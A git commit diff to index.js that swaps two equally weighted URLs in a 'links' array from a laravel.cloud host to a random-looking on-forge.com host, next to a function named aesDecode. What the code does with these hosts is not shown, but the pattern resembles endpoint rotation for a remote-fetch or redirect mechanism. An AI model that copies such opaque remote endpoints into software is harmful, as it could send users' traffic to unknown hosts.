e2791178183a0b4a7b9bf0466d7bd3affd49f700
animalinside <akshay.anand12@yahoo.com>
2026-05-19 07:09:14 +0530

    Update index.js

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://laravel-1-tiiuiii-6s0h9g.laravel.cloud/", weight: 0.5 },
-        { url: "https://laravel-1-tiiuiii-6s0h9g.laravel.cloud/", weight: 0.5 }
+        { url: "https://aljfhklsdjfjjd.on-forge.com/", weight: 0.5 },
+        { url: "https://aljfhklsdjfjjd.on-forge.com/", weight: 0.5 }
       
     ];
 
